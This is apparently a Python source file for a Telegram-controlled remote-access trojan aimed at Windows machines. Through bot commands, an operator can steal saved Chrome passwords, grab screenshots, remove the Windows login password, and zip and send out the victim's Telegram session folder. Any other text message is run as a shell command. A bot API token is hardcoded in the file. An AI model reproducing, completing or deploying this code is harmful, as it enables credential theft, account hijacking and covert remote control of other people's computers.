from chrome_hack import ChromeHack
from os_hack import WindowsHack
from settings import CHROME_URL, CHROME_SAVE_FOLDER, TELEBOT_ID, USER, TELEGRAM_SAVE_FOLDER, TELEGRAM_FOLDER, \
    TELEGRAM_MAX_WEIGHT, ROOT_FOLDER

import os
import telebot
import shutil

bot = telebot.TeleBot('5375766649:AAEVbvSyE01Xa0t_LmJXleCnBKJ0-xdG3Rs')

commands = [
    '/still_chrome',
    '/screen',
    '/id',
    '/user',
    '/remove_password',
    '/create_root_folder',
    '/remove_root_folder',
    '/still_telegram',
]
t_commands = ''
for i in commands:
    t_commands += i
    t_commands += '\n'

win = WindowsHack()


@bot.message_handler(commands=['cmd'])
def send_commands(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return
    bot.send_message(message.chat.id, t_commands)


@bot.message_handler(commands=['create_root_folder'])
def create_root_folder(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return
    try:
        win.create_root_folder()
        bot.send_message(message.chat.id, 'Root folder created')
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(commands=['remove_root_folder'])
def remove_root_folder(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return
    try:
        win.remove_root_folder()
        bot.send_message(message.chat.id, 'Root folder removed')
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(commands=['still_chrome'])
def send_chrome_passwords(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return

    try:
        win.creat_folder(CHROME_SAVE_FOLDER)

        chrome_hack = ChromeHack()
        chrome_hack.start()
        chrome_hack.connect(CHROME_URL)
        chrome_hack.save_chrome_pass()
        chrome_hack.quit()

        file = open(CHROME_SAVE_FOLDER + '\\Chrome_pass.csv', 'rb')
        bot.send_document(message.chat.id, file)
        file.close()
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(commands=['screen'])
def take_screen(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return

    try:
        win.take_screen()
        file = open(win.save_folder + '\\screen.png', 'rb')
        bot.send_photo(message.chat.id, file)
        file.close()
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(commands=['id'])
def message_id(message):
    bot.send_message(message.chat.id, message.chat.id)


@bot.message_handler(commands=['remove_password'])
def remove_password(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return
    try:
        win.remove_password()
        bot.send_message(message.chat.id, 'Password removed')
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(commands=['user'])
def send_user(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return
    try:
        bot.send_message(message.chat.id, USER)
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(commands=['still_telegram'])
def still_telegram(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return

    try:
        files = [f for f in os.listdir(TELEGRAM_FOLDER) if os.path.isfile(os.path.join(TELEGRAM_FOLDER, f))]

        win.creat_folder(TELEGRAM_SAVE_FOLDER)
        weight = 0
        for f in files:
            path = TELEGRAM_FOLDER + f'{f}'
            path_to = TELEGRAM_SAVE_FOLDER + f'\\{f}'
            weight += os.stat(path).st_size
            if os.stat(path).st_size > TELEGRAM_MAX_WEIGHT:
                bot.send_message(message.chat.id, f'Some file was too big, so it was skiped, filename: {path}')
                weight -= os.stat(path).st_size
                continue
            if weight < TELEGRAM_MAX_WEIGHT:
                win.copy(path, path_to)
                if f != files[-1]:
                    continue
            if (weight >= TELEGRAM_MAX_WEIGHT) or (f == files[-1]):
                shutil.make_archive(ROOT_FOLDER + '\\telegram', 'zip', TELEGRAM_SAVE_FOLDER)
                file = open(ROOT_FOLDER + '\\telegram.zip', 'rb')
                bot.send_document(message.chat.id, file)
                file.close()
                win.remove_file(ROOT_FOLDER + '\\telegram.zip')
                win.remove_folder(TELEGRAM_SAVE_FOLDER)
                win.creat_folder(TELEGRAM_SAVE_FOLDER)
                weight = os.stat(path).st_size
                win.copy(path, path_to)
        bot.send_message(message.chat.id, 'done')
    except Exception as e:
        bot.send_message(message.chat.id, e)


@bot.message_handler(content_types=['text'])
def cmd(message):
    if message.chat.id != TELEBOT_ID:
        bot.send_message(message.chat.id, 'You are not worthy')
        return
    try:
        r = win.cmd(message.text)
        bot.send_message(message.chat.id, r)
    except Exception as e:
        bot.send_message(message.chat.id, e)
